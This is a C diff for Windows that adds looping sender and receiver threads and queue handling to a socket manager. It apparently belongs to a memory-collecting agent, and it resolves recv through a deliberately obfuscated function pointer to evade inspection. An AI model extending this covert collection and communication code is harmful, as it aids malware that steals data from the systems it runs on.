@@ -12,6 +12,8 @@
 #include "../memoryCollector/MemoryCollector.h"
 
 SOCKET _initWindowsSocket();
+BOOL _sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message);
+PMESSAGE _receiveMessage(PSOCKET_MANAGER sManager);
 
 PSOCKET_MANAGER initSocketManager(PMESSAGE_QUEUE queueMessageReceived, PMESSAGE_QUEUE queueMessagesToSend)
 {
@@ -36,8 +38,40 @@ BOOL destroySocketManager(PSOCKET_MANAGER pSockManager)
     return TRUE;
 };
 
-BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
+void receiveMessageThread(PRECV_FUNCTION_ARGS args)
 {
+    PSOCKET_MANAGER pSockManager =  args->sManager;
+    printf("[+] Receiver prepare...\n");
+    while(TRUE)
+    {
+       PMESSAGE messageReceived = _receiveMessage(pSockManager);
+       push(pSockManager->queueMessageReceived, messageReceived);
+    }
+}
+
+BOOL sendMessageThread(PSEND_FUNCTION_ARGS args)
+{
+    PSOCKET_MANAGER pSockManager =  args->sManager;
+    printf("[+] Sender prepare...\n");
+    while(TRUE)
+    {
+        PMESSAGE messageToSend = pop(pSockManager->queueMessagesToSend);
+        if(messageToSend == NULL)
+        {
+            Sleep(3000);
+        }
+        _sendMessage(pSockManager, messageToSend);
+    }
+    return TRUE;
+}
+
+BOOL _sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
+{
+    if(message == NULL)
+    {
+        return FALSE;
+    }
+    printf("[+] Sending new message...\n");
     /* INITIALIZE SIZE VARIABLES */
     DWORD size = message->size;
     DWORD sizeToAlloc = size + sizeof(DWORD) + 1; // sizeToAlloc is -> size of the payload + size of a DWORD + SIZE of a char
@@ -75,8 +109,9 @@ BOOL sendMessage(PSOCKET_MANAGER sManager, PMESSAGE message)
     return TRUE;
 };
 
-void receiveMessage(PSOCKET_MANAGER sManager)
+PMESSAGE _receiveMessage(PSOCKET_MANAGER sManager)
 {   
+    printf("[+] Receiving new message...\n");
     /* OBTAIN OBFUSCTED FUNCTION */
     typedef NTSTATUS(WINAPI* RecvFromMinic)(
 		SOCKET      s,
@@ -91,7 +126,7 @@ void receiveMessage(PSOCKET_MANAGER sManager)
     if (recvFromMinic(sManager->s, &responseType, sizeof(char), 0) == SOCKET_ERROR)
     {
         printf("[-] recv failed -> %i\n", WSAGetLastError());
-        return;
+        return NULL;
     };
     
     /* READING PSIZE_FIELD_SIZE BYTES FOR MESSAGE PAYLOAD SIZE FIELD */
@@ -99,7 +134,7 @@ void receiveMessage(PSOCKET_MANAGER sManager)
     if (recvFromMinic(sManager->s, size, PSIZE_FIELD_SIZE, 0) == SOCKET_ERROR)
     {
         printf("[-] recv failed -> %i\n", WSAGetLastError());
-        return;
+        return NULL;
     };
 
     /* READING payloadSize BYTES FOR MESSAGE PAYLOAD */
@@ -108,10 +143,10 @@ void receiveMessage(PSOCKET_MANAGER sManager)
     if (recvFromMinic(sManager->s, buffer, payloadSize, 0) == SOCKET_ERROR)
     {
         printf("[-] recv failed -> %i\n", WSAGetLastError());
-        return;
+        return NULL;
     };
 
-    createMessage(responseType, payloadSize, buffer);
+    return createMessage(responseType, payloadSize, buffer);
 
 };
 
